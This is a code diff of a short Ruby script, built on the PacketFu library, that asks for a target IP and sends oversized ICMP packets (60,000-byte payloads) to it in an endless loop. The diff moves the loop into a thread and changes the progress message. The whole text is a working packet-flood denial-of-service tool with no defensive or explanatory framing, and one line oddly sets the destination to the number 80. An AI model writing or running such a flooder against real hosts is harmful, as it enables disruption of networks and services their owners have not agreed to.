@@ -6,23 +6,24 @@ puts "Enter IP"
 
 ip = gets.chomp
 
+Thread.new {
+  pkt = PacketFu::ICMPPacket.new(:config => PacketFu::Utils.whoami?)
 
-pkt = PacketFu::ICMPPacket.new(:config => PacketFu::Utils.whoami?)
+  pkt.ip_daddr = ip
 
-pkt.ip_daddr = ip
+  pkt.ip_dst = 80
 
-pkt.ip_dst = 80
+  pkt.payload = "A" * 60000
 
-pkt.payload = "A" * 60000
+  count = 0 
 
-count = 0 
-
-while true do
+  while true do
 
 	pkt.to_w
 	count += 1
 
-	puts "Sent #{count} packets"
+	puts "Emitting #{count} packets."
 
-end
+  end
 
+}.join
